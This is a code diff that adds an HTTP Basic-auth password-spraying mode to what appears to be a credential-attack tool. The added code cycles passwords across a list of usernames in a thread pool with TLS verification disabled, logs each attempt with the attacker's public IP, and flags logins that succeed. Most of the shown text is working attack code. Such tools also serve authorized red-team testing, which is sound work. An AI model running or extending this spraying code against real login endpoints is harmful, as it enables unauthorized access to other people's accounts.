@@ -65,6 +65,27 @@ consumer.start()
 ip = get('https://api.ipify.org').text
 print('My public IP address is: {}'.format(ip))
 
+def basic_err_cde_login(uname,taskname, url, password, success_code, threadDelay):
+
+    session = rq.Session()
+    try:
+        resp = session.get(url, auth=(uname, password), verify=False)
+        r_status = str(resp.status_code)
+    except Exception as x:
+        print(type(x),x)
+        r_status = "Error Occurred"
+    pass
+
+    row = taskname + "," + url + ","  + uname + "," + password + "," + r_status + "," + format(ip) + ","+ str(datetime.datetime.now())
+    queue.put(row)
+
+    if r_status == success_code:
+        print ("[+] Alert!! Response code:  %s with :- %s : %s" % (r_status, uname, password))
+    else:
+        print ("[-] Response code:  %s with :- %s : %s" % (r_status, uname, password))
+
+    time.sleep(int(threadDelay))
+    #sleep for the delay time and then die
 
 def ntlm_login(uname,taskname, url, domain, password, threadDelay):
 
@@ -247,6 +268,29 @@ def main():
                     time.sleep(int(passDelay))
 
                 print ("[*] Activity End Time : " + str(datetime.datetime.now()))
+
+                # basic_err_cde_login(uname,taskname, url, password, success_code, threadDelay)
+            elif type == "basicapierrorcode":
+
+                success_code = config[section]["success_code"]
+                print ("[*] Activity Start Time : " + str(datetime.datetime.now()))
+                # prepare the arguments for do_login function
+                # this list will then be passed to multiprocessing pool
+                # only uname parameter of do_login will change rest remain the same.
+                # partial() will keep the rest of the parameters specified constant
+                for password in passwords:
+
+                    do_login_args = partial(basic_err_cde_login, taskname=taskName, url=url, password=password, success_code=success_code, threadDelay=userDelay)
+
+                    print ("[*] Starting http status code basic api based password spray against %s with %s users using the password %s !" % (url, unum, password))
+
+                    # https://stackoverflow.com/questions/2846653/how-can-i-use-threading-in-python
+                    pool = ThreadPool(int(numThreads))
+                    results = pool.map(do_login_args, users)
+                    time.sleep(int(passDelay))
+
+                print ("[*] Activity End Time : " + str(datetime.datetime.now()))
+
             elif type == "headless":
 
                 login_select = config[section]["username_field"]
